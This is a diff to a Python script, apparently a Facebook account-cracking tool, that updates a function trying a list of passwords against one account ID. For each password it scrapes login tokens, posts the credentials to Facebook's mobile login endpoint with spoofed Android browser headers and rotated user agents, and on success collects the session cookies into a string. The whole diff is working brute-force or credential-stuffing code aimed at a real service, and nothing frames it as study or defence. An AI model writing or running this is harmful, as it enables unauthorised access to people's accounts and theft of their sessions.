@@ -1211,39 +1211,36 @@ def m6(idf,pwv):
  try:
   for ps in pwv:
    session = requests.Session()
-            #animasi = random.choice(["\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING","\x1b[1;97mKING","\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING"])
-            #sys.stdout.write(f'\r     {K}[{H}{animasi}{P}/{A}%s{K}]{N}OK{B}>{H}%s'%(loop,len(ok))),
-            #sys.stdout.flush()
-   pro = random.choice(ugen)
+   KING=random.choice(ugen) 
    free_fb = session.get('https://m.facebook.com').text
-   log_data = {
-             "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            "try_number":"0",
-            "unrecognized_tries":"0",
-            "email":idf,
-            "pass":ps,
-            "login":"Log In"}
-   header_freefb = {
-            'Host': 'm.facebook.com',
-            'method': 'GET',
-            'path': '/login/device-based/login/async/',
-            'scheme': 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;',
-            'accept-encoding': 'gzip, deflate, br',
-            'accept-language': 'en-US,en;q=0.9',
-            'referer': 'https://m.facebook.com',
-            'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 11; Pixel 4 Build/RQ1A.210205.004; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.212 Mobile Safari/537.36 [FBAN/FB4A;FBAV/288.0.0.72.119;FBBV/176964424;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/176964424;FBCR/]'}
-   lo = session.post('https://free.facebook.com/login/device-based/password/?',data=log_data,headers=header_freefb).text
+   info={"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),"try_number":"0","unrecognized_tries":"0","email":idf,'pass':ps,"login":"Log In"}
+   had={
+   'Host': f'm.facebook.com',
+   'content-length': '1662',
+   'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Android WebView";v="120"',
+   'sec-ch-ua-mobile': '?1',
+   'user-agent': 'Mozilla/5.0 (Linux; Android 11; Pixel 4 Build/RQ1A.210205.004; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.212 Mobile Safari/537.36 [FBAN/FB4A;FBAV/288.0.0.72.119;FBBV/176964424;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/176964424;FBCR/]',
+   'x-response-format': 'JSONStream',
+   'content-type': 'application/x-www-form-urlencoded',
+   'x-fb-lsd': 'AVrEIFcZUZg',
+   'viewport-width': '360',
+   'sec-ch-ua-platform-version': "",
+   'x-requested-with': 'XMLHttpRequest',
+   'x-asbd-id': '129477',
+   'dpr': '2',
+   'sec-ch-ua-full-version-list': '',
+   'sec-ch-ua-model': "",
+   'sec-ch-prefers-color-scheme': 'light',
+   'sec-ch-ua-platform': '"Android"',
+   'accept': '*/*',
+   'origin': f'https://m.facebook.com',
+   'sec-fetch-site': 'same-origin',
+   'sec-fetch-mode': 'cors',
+   'sec-fetch-dest': 'empty',
+   'referer': f'https://m.facebook.com/login/?wtsid=rdr_0HpBBBchEc4DCrXrX&refsrc=deprecated&_rdr',
+   'accept-encoding': 'gzip, deflate, br',
+   'accept-language': 'en-IE,en-US;q=0.9,en;q=0.8'}
+   lo = session.post("https://m.facebook.com/login/device-based/login/async/",data=info,headers=had).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
